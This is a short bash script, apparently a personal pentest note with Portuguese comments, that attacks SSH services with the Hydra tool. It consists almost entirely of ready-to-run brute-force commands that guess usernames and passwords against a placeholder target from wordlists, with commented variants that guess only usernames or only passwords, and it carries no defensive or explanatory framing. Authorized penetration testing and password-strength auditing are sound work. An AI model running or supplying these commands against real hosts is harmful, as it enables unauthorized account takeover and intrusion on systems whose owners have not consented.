#! /bin/bash
#Autor: Joao Nossol
#github: https://github.com/joaonossolb

#Atacando serviços SSH COM HYDRA


#Realiza Brute Force no usuario e na senha
hydra -L wordlistUsuarios.txt -P wordlistSenhas.txt -v <TARGET> ssh

#Realiza Brute force apenas no usuario
#hydra -L wordlistUsuarios.txt -p senha que eu sei -v <TARGET> ssh

#Realiza Brute force apenas na senha
#hydra -l usuario -P wordlistSenhas.txt -v <TARGET> ssh
